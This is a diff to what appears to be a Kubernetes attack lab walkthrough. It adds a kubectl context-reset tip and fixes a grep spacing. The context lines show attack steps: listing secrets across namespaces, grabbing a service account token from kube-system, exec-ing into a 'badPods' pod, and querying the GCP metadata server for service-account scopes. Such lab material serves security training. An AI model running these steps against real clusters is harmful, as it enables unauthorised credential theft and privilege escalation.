@@ -982,7 +982,7 @@ kubectl get secrets --all-namespaces
 ```
 Bingo, seems it can list secrets...
 ```
-kubectl get secrets -n kube-system |grep clusterrole
+kubectl get secrets -n kube-system | grep clusterrole
 ```
 
 Let's get the token for an interesting account
@@ -1090,6 +1090,11 @@ https://raw.githubusercontent.com/digital-shokunin/badPods/main/manifests/nothin
 --namespace lab-namespace
 ```
 
+>**Note:** Exit too many times, had to restart your session, now getting a server <address> refused message? Try:
+```
+kubectl config use-context kind-lab
+```
+
 ```
 kubectl exec -it nothing-allowed-exec-pod -n lab-namespace -- bash
 ```
@@ -1113,6 +1118,8 @@ curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata
 ```
 curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
 ```
+
+
 
 ## Appendix
 
